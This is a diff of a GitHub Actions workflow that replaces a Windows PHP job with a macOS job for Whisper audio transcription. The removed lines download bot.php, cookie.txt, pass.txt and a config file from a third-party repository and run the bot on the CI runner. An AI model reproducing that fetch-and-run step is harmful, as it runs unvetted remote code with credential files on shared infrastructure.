@@ -1,41 +1,39 @@
-name: PHP on Windows (Full Extensions)
+name: Whisper Transcription
 
 on:
   push:
-    branches: [ main ]
+    paths:
+      - '**.mp3'
+      - 'transcribe.py'
   workflow_dispatch:
 
 jobs:
-  php-windows:
-    runs-on: windows-latest
+  transcribe:
+    runs-on: macos-latest
 
     steps:
-      - name: Checkout Code
-        uses: actions/checkout@v4
+      - name: Checkout repo
+        uses: actions/checkout@v3
 
-      - name: Setup PHP (Latest) with All Extensions
-        uses: shivammathur/setup-php@v2
+      - name: Install FFmpeg
+        run: |
+          brew install ffmpeg
+
+      - name: Set up Python
+        uses: actions/setup-python@v5
         with:
-          php-version: 'latest'
-          extensions: >
-            bcmath, bz2, calendar, curl, exif, ffi, fileinfo, ftp, gd,
-            gettext, gmp, iconv, intl, mbstring, mysqli, opcache, pcntl,
-            pdo, pdo_mysql, pdo_pgsql, pdo_sqlite, pgsql, shmop, snmp,
-            soap, sockets, sodium, sysvmsg, sysvsem, sysvshm, tidy, tokenizer,
-            xml, xmlreader, xmlwriter, xsl, zip, zlib, openssl
-          tools: composer
-          coverage: none
+          python-version: 3.10
 
-      - name: Show PHP Version and Extensions
+      - name: Install dependencies
         run: |
-          php -v
-          php -m
+          pip install git+https://github.com/openai/whisper.git
+          pip install torch
 
-      - name: Download 4 Files
-        run: |
-          Invoke-WebRequest -Uri https://github.com/kalepailmine001/botfiles/raw/refs/heads/main/bot.php -OutFile bot.php
-          Invoke-WebRequest -Uri https://github.com/kalepailmine001/botfiles/raw/refs/heads/main/config.json -OutFile config.json
-          Invoke-WebRequest -Uri https://github.com/kalepailmine001/botfiles/raw/refs/heads/main/cookie.txt -OutFile cookie.txt
-          Invoke-WebRequest -Uri https://github.com/kalepailmine001/botfiles/raw/refs/heads/main/pass.txt -OutFile pass.txt
-          php bot.php
-          
+      - name: Run transcription
+        run: python transcribe.py
+
+      - name: Upload transcription output
+        uses: actions/upload-artifact@v4
+        with:
+          name: whisper-transcript
+          path: transcript.txt
